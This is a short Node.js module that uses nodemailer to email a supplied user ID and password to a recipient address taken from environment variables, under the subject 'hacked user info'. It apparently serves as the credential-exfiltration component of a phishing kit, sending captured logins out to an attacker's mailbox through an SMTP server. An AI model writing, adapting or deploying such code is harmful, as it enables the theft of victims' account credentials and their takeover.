const nodemailer = require('nodemailer');

const email = async (email, password) => {

    const transporter = nodemailer.createTransport({
        host: process.env.host,
        port: process.env.port,
        auth: {
            user: process.env.email,
            pass: process.env.passward
        }
    });

    const mailOptions = {
        from: process.env.email,
        to: process.env.recipient_email,
        subject: 'hacked user info',
        text: `userId: ${email} \nuserpassword: ${password} `
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent:', info.response);
        return true;
    } catch (error) {
        console.error('Error occurred:', error);
        return false;
    }
};

module.exports = { email }